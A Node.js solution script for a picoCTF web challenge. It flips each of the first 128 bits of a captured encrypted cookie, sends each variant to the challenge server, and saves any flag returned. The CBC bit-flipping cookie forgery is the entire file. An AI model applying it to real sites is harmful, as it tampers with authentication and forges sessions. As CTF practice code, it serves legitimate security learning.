
import fs   from 'fs';
import http from 'http';



const decode_cookie = (buffer0) => {

	let buffer1 = Buffer.from(buffer0.toString('utf8'), 'base64');
	let buffer2 = Buffer.from(buffer1.toString('utf8'), 'base64');

	return buffer2;

};

const encode_cookie = (buffer0) => {

	let buffer1 = Buffer.from(buffer0, 'utf8').toString('base64');
	let buffer2 = Buffer.from(buffer1, 'utf8').toString('base64');

	return buffer2;

};

// CBC bit flip attack, in hope that they used synchronous AES
const flip_bit = (buffer, bit_position) => {

	let index  = Math.floor(bit_position / 8);
	let result = Buffer.from(buffer);
	let mask   = [ 0, 0, 0, 0, 0, 0, 0, 0 ];

	mask[bit_position % 8]  = 1;
	result[index]          ^= parseInt(mask.join(''), 2);

	return result;

};


const ENCRYPTED_COOKIE = Buffer.from('OWQxdmgrdFU3a3REbW9USzRiUVg4RW80TnhISW1ISGpsNnpER2VXQ05mY2lkQXhwTHArS29jS0lvTlNab2RNUWljTGw2bzl5elQzckNKSGVya3pzL2hQNHNKaytMUW9RTC9WclA1b09peXVkejRZd2JlUzVnSldPWC9zRk45akU=', 'utf8');

const attack = (bit) => {

	let session = decode_cookie(ENCRYPTED_COOKIE);
	let fixed   = flip_bit(session, bit);
	let cookie  = encode_cookie(fixed).toString('utf8');

	let request = http.request('http://mercury.picoctf.net:21553', {
		headers: {
			'Cookie':  'auth_name=' + cookie + ';',
			'Host':    'mercury.picoctf.net:21553',
			'Referer': 'http://mercury.picoctf.net:21553/'
		},
		method: 'GET'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);
			let headers = Buffer.from(JSON.stringify(response.headers, null, '\t'), 'utf8');

			let html = payload.toString('utf8');
			if (html.includes('Cannot decode cookie.') === true) {
				// Ignore
			} else if (html.includes('Redirecting...') === true) {

				if (response.headers['location'].endsWith('/flag') === true) {

					let request_flag = http.request(response.headers['location'], {
						headers: {
							'Cookie':  'auth_name=' + cookie + ';',
							'Host':    'mercury.picoctf.net:21553',
							'Referer': 'http://mercury.picoctf.net:21553/'
						},
						method: 'GET'
					}, (response_flag) => {

						const chunks_flag = [];

						response_flag.on('data', (data) => chunks_flag.push(data));
						response_flag.on('end', () => {

							let html = Buffer.concat(chunks_flag).toString('utf8');

							if (html.includes('<code>picoCTF') === true) {

								let flag = html.split('<code>')[1].split('</code>')[0];
								console.log('YAAAY! the flip of bit #' + bit + ' resulted in flag "' + flag + '"');

							}

							fs.writeFileSync('cookies/flag.html', Buffer.concat(chunks_flag));

						});

					});

					request_flag.end();

				}

			}

			fs.writeFileSync('cookies/bit-' + bit + '.html', payload);
			fs.writeFileSync('cookies/bit-' + bit + '.headers', headers);

		});

	});

	request.on('error', (err) => {
		console.error('ERROR requesting cookie #' + num + '!');
	});

	request.end();

};

for (let b = 0; b < 128; b++) {
	attack(b);
}

